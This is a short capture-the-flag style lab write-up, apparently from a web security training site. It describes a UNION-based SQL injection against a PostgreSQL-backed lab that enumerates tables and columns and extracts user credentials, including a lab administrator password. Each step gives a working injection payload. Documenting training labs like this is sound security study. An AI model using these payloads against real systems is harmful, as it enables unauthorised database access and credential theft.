# Lab 9 - **SQL injection attack, listing the database contents on non-Oracle databases**

**Status**: Solved on August 2, 2023

**Objective**: Obtain the username and password of all users, and the log in as the `administrator` user.

## Solving Process

- The number of columns was found to be 2, by using this payload: `' order by 2 --` Since it’s the highest column number that didn’t throw an internal server error.
- The database version was retrieved with this payload: `' UNION SELECT version(),NULL --`. The right query for the version was found by trying the available options until a 200 OK response was thrown.
  - Response: `PostgreSQL 12.15 (Ubuntu 12.15-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit`
- By searching on Google for the available columns in `information_schema.tables`, it was found that a `table_name` column exists, which can be used to check which tables in the database may hold user information.
  - This payload was used to output the entries stored in `table_names`: `' UNION SELECT table_name,NULL FROM information_schema.tables --`
- After checking the outputted table names, the following may hold users’ information:
  - `pg_user`
  - `users_aifmth`
- The column names for those tables were outputted by using the following payload (built with the help of the [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet): 
  - `' UNION SELECT column_name,NULL FROM information_schema.columns where table_name = 'users_aifmth' --`
  - The table that holds the most interesting column names is `users_aifmth`, which are: `username_wopbqk` and `password_youquw`
- Finally, the users & their passwords where gathered by quering the `users_aifmth` table with this payload: `' UNION SELECT username_wopbqk,password_youquw FROM users_aifmth --`
  - And the administrator credentials were rendered in the page’s html
  - Username: `administrator`. Password: `fb17rmxxk876i7vmaqf2`
